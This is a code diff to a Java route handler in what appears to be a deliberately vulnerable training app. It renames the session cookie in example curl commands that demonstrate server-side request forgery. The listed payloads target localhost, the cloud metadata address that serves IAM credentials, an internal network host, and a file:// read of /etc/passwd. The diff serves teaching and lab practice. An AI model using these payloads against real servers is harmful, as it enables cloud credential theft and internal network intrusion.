@@ -186,16 +186,16 @@ public class SsrfHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"Loopback probe", "http://localhost:8090/",
              "Forces the server to fetch its own home page — probes internal services not exposed externally.", "url",
-             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'url=http://localhost:8090/'"},
+             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'url=http://localhost:8090/'"},
             {"Cloud metadata", "http://169.254.169.254/latest/meta-data/",
              "AWS/GCP/Azure all serve IAM credentials at this link-local address. One request can leak cloud keys.", "url",
-             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'"},
+             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'"},
             {"Internal network scan", "http://192.168.1.1/",
              "The server may sit on an internal network. Use SSRF to reach hosts the attacker cannot access directly.", "url",
-             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'url=http://192.168.1.1/'"},
+             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'url=http://192.168.1.1/'"},
             {"File read (file://)", "file:///etc/passwd",
              "Some HTTP clients allow file:// URLs. This reads a local file from the server's filesystem.", "url",
-             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'url=file:///etc/passwd'"},
+             "curl -s -X POST http://localhost:8090/ssrf/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'url=file:///etc/passwd'"},
         });
 
         String content = TemplateEngine.vulnerabilityBadge(Messages.get("ssrf.badge.id"), Messages.get("ssrf.badge.name"), Messages.get("ssrf.badge.tag")) + info + exploits + panels;
